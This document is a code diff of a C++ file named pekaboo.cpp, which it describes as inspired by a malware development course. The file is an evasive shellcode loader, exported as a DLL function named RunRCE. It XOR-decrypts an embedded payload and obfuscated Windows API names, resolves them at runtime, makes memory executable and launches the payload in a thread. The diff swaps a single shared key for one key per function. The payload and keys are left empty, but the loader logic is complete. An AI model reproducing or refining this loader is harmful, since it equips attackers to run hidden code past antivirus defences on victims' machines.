@@ -7,7 +7,10 @@ pekaboo.cpp - inspired by RTO malware development course implementation
 #include <stdlib.h>
 #include <string.h>
 
+// encrypted payload
 unsigned char my_payload[] = { };
+
+// encrypted functions
 unsigned char s_va[] = { };
 unsigned char s_vp[] = { };
 unsigned char s_ct[] = { };
@@ -21,8 +24,13 @@ unsigned int s_ct_len = sizeof(s_ct);
 unsigned int s_wfso_len = sizeof(s_wfso);
 unsigned int s_rmm_len = sizeof(s_rmm);
 
+// keys
 char my_payload_key[] = "";
-char f_key[] = "";
+char s_va_key[] = "";
+char s_vp_key[] = "";
+char s_ct_key[] = "";
+char s_wfso_key[] = "";
+char s_rmm_key[] = "";
 
 LPVOID (WINAPI * pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
@@ -65,35 +73,35 @@ __declspec(dllexport) BOOL WINAPI RunRCE(void) {
     DWORD oldprotect = 0;
 
     // decrypt VirtualAlloc
-    XOR((char *) s_va, s_va_len, f_key, sizeof(f_key));
+    XOR((char *) s_va, s_va_len, s_va_key, sizeof(s_va_key));
     pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), s_va);
 
-    // Allocate memory for payload
+    // allocate memory for payload
     exec_mem = pVirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    // Decrypt payload
+    // decrypt payload
     XOR((char *) my_payload, my_payload_len, my_payload_key, sizeof(my_payload_key));
 
-    // Copy payload to allocated buffer
-    XOR((char *) s_rmm, s_rmm_len, f_key, sizeof(f_key));
+    // copy payload to allocated buffer
+    XOR((char *) s_rmm, s_rmm_len, s_rmm_key, sizeof(s_rmm_key));
     pRtlMoveMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), s_rmm);
     pRtlMoveMemory(exec_mem, my_payload, my_payload_len);
 
     // decrypt VirtualProtect
-    XOR((char *) s_vp, s_vp_len, f_key, sizeof(f_key));
+    XOR((char *) s_vp, s_vp_len, s_vp_key, sizeof(s_vp_key));
     pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), s_vp);
     rv = pVirtualProtect(exec_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
-    // If all good, launch the payload
+    // if all good, launch the payload
     if ( rv != 0 ) {
 
         // decrypt CreateThread
-        XOR((char *) s_ct, s_ct_len, f_key, sizeof(f_key));
+        XOR((char *) s_ct, s_ct_len, s_ct_key, sizeof(s_ct_key));
         pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), s_ct);
         th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
 
         // decrypt WaitForSingleObject
-        XOR((char *) s_wfso, s_wfso_len, f_key, sizeof(f_key));
+        XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
         pWaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), s_wfso);
         pWaitForSingleObject(th, -1);
     }
